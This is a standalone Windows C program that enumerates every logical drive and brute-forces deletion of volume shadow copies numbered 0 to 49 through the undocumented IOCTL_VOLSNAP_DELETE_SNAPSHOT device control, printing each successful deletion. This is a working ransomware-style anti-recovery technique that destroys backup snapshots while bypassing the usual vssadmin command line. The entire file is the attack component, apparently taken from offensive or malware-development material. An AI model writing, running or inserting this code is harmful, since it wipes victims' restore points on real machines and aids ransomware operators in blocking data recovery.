#include <Windows.h>
#include <stdio.h>


// https://github.com/eronnen/procmon-parser/blob/master/procmon_parser/consts.py#L1028
#define IOCTL_VOLSNAP_DELETE_SNAPSHOT					0x53C038

// Try \Device\HarddiskVolumeShadowCopy1..50
#define MAX_TRIES_TO_DELETE_HARDDISK_SHADOWCOPIES		50


typedef struct _VOLSNAP_DELETE_SNAPSHOT 
{
	USHORT	uShadowCopyVolumeNameLen;	
	WCHAR  	szShadowCopyVolume[MAX_PATH];

} VOLSNAP_DELETE_SNAPSHOT, * PVOLSNAP_DELETE_SNAPSHOT;


BOOL BruteForceDeletingShadowCopiesViaIOCTL(OUT OPTIONAL PDWORD pdwNmbrOfCopiesDeleted) {


	VOLSNAP_DELETE_SNAPSHOT		VolSnapDeleteSnapshot	= { 0 };
	DWORD						dwNumberOfDrives		= 0x00,
								dwBytesReturned			= 0x00;
	WCHAR						szDrives[MAX_PATH]		= { 0 };
	WCHAR						szVolumePath[0x10]		= { 0 };
	WCHAR*						pszDrive				= NULL;
	HANDLE						hVolume					= INVALID_HANDLE_VALUE;
	BOOL						bReturn					= FALSE;

	if (pdwNmbrOfCopiesDeleted) *pdwNmbrOfCopiesDeleted = 0x00;

	if ((dwNumberOfDrives = GetLogicalDriveStringsW(MAX_PATH, szDrives)) == 0x00) {
		printf("[!] GetLogicalDriveStringsW Failed With Error: %ld \n", GetLastError());
		goto _END_OF_FUNC;
	}

	pszDrive = szDrives;

	while (*pszDrive)
	{
		swprintf(szVolumePath, _countof(szVolumePath), L"\\\\.\\%c:", pszDrive[0]);

		if ((hVolume = CreateFileW(szVolumePath, FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error: %ld \n", GetLastError());
			goto _END_OF_FUNC;
		}

		for (int i = 0; i < MAX_TRIES_TO_DELETE_HARDDISK_SHADOWCOPIES; i++)
		{

			WCHAR szShadowCopyVolume[MAX_PATH] = { 0 };

			swprintf(szShadowCopyVolume, _countof(szShadowCopyVolume), L"\\Device\\HarddiskVolumeShadowCopy%d", i);

			VolSnapDeleteSnapshot.uShadowCopyVolumeNameLen = (USHORT)lstrlenW(szShadowCopyVolume) * sizeof(WCHAR);
			RtlCopyMemory(VolSnapDeleteSnapshot.szShadowCopyVolume, szShadowCopyVolume, VolSnapDeleteSnapshot.uShadowCopyVolumeNameLen + sizeof(WCHAR));

			if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_DELETE_SNAPSHOT, &VolSnapDeleteSnapshot, sizeof(VOLSNAP_DELETE_SNAPSHOT), NULL, 0x00, &dwBytesReturned, NULL)) 
			{
				// If shadow copy does not exist, DeviceIoControl will fail with ERROR_INVALID_PARAMETER
				if (GetLastError() != ERROR_INVALID_PARAMETER) 
					printf("[!] DeviceIoControl Failed With Error: %ld \n", GetLastError());
				
				continue;
			}

			printf("[+] Successfully Deleted Shadow Copy: %ws of %ws \n", szShadowCopyVolume, szVolumePath);

			if (pdwNmbrOfCopiesDeleted) (*pdwNmbrOfCopiesDeleted)++;
		}

		pszDrive += lstrlenW(pszDrive) + 1;

		CloseHandle(hVolume);

		hVolume = INVALID_HANDLE_VALUE;
	}

	bReturn = TRUE;

_END_OF_FUNC:
	if (hVolume != INVALID_HANDLE_VALUE)
		CloseHandle(hVolume);
	return bReturn;
}




int main() {
	
	DWORD dwNumberOfSnapshotDeleted = 0x00;

	if (!BruteForceDeletingShadowCopiesViaIOCTL(&dwNumberOfSnapshotDeleted))
        return -1;

    if (dwNumberOfSnapshotDeleted)
        printf("[+] Successfully Deleted [ %lu ] Shadow Copies \n", dwNumberOfSnapshotDeleted);

	return 0;
}

